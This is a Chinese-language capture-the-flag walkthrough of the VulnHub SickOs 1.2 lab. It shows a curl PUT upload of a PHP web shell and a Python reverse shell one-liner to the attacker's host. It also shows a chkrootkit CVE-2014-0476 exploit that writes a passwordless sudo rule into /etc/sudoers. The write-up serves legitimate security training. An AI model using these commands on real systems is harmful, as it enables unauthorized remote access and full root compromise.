# SickOs: 1.2

https://www.vulnhub.com/entry/sickos-12,144/

difficulty: not know

Finish Date：2024-4-17

## IP

192.168.10.165

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 668cc0f2857c6cc0f6ab7d480481c2d4 (DSA)
|   2048 ba86f5eecc83dfa63ffdc134bb7e62ab (RSA)
|_  256 a16cfa18da571d332c52e4ec97e29eaf (ECDSA)
80/tcp open  http    lighttpd 1.4.28
|_http-server-header: lighttpd/1.4.28
|_http-title: Site doesn't have a title (text/html).
```

22 端口上不能匿名登陆，也没显示什么有用信息。

看到 80 对应的服务为 lighttpd 1.4.28，搜索相关漏洞信息。可能有一个文件包含的漏洞：31396，/~nobody/etc/passwd 尝试后不成功。

用目录爆破工具，发现了/test 目录，能显示目录文件列表，但是里面是空的没有文件。看样子突破口应该是在这个/test 目录中，最好是能上传一个后门文件，尝试在 BP 中抓包，修改 web request 请求方式为 OPYIONS，发现支持 PUT 请求：

```
Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
Allow: OPTIONS, GET, HEAD, POST
```

修改请求方式为 PUT ，发现响应中状态码：HTTP/1.1 201 Created，尝试看是否能 PUT 一个后门文件，使用 curl 命令：

```
curl -X PUT -d '<?php system($_GET["cmd"]);?>' http://192.168.10.165/test/shell.php
```

http://192.168.10.165/test/shell.php?cmd=id 能验证长传已经成功并且能执行命令，下面就是执行反弹命令，在 kali 中使用 nc 建立监听，获得 shell 执行权限，发现目标系统中有/usr/bin/python，直接进行利用：

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.3",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

执行后，能开到网页在加载，但是在 kali 上看不到连接信息，猜测有可能是系统有防火墙，需要找到系统开放的外联端口。尝试 8080 是否能够外联，得到了反弹的 shell，先升级下 tty：python -c 'import pty; pty.spawn("/bin/bash")'

在 /home 目录下发现了用户：john，uname -a 发现系统内核可能存在如下漏洞：https://www.exploit-db.com/exploits/31347

经过探测，发现 443 端口也能外联，在 kali 上搭建 python web 服务，下载 linpeas 到目标机器进行枚举，发现内核版本上可能存在漏洞，计划任务上发现了 chkrootkit 和 lighttpd 这两个不是系统原有的计划任务。

发现 chkrootkit 版本有漏洞 CVE-2014-0476，/tmp/update 中的程序会被定时调用：

```
apt-cache policy chkrootkit
chkrootkit:
  Installed: (none)
  Candidate: 0.49-4ubuntu1.1
```

利用过程如下：

```
echo 'mkdir /tmp/vry4n' > /tmp/update
chmod 777 /tmp/update

等待系统运行计划任务 chkrootkit 脚本
ls -l /tmp 进行查看是否利用成功，发现tmp目录下多了一个vry4n文件夹，而且属于root用户

将攻击代码写入到脚本中：
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```

## flag

等待计划任务脚本执行后，就能使用 sudo su 切换到 root 用户，获得最终的 flag：

```
www-data@ubuntu:/etc/cron.daily$ sudo su
sudo su
root@ubuntu:/etc/cron.daily# id
id
uid=0(root) gid=0(root) groups=0(root)

root@ubuntu:~# cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.

Thanks for giving this try.

@vulnhub: Thanks for hosting this UP!.
```

最后查看一下防火墙的设置(只允许 22、80、8080、443)：

```
root@ubuntu:/etc/cron.daily# iptables -L
iptables -L
Chain INPUT (policy DROP)
target     prot opt source               destination
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:http-alt
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:https

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination

Chain OUTPUT (policy DROP)
target     prot opt source               destination
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:http
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http-alt
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:https
```
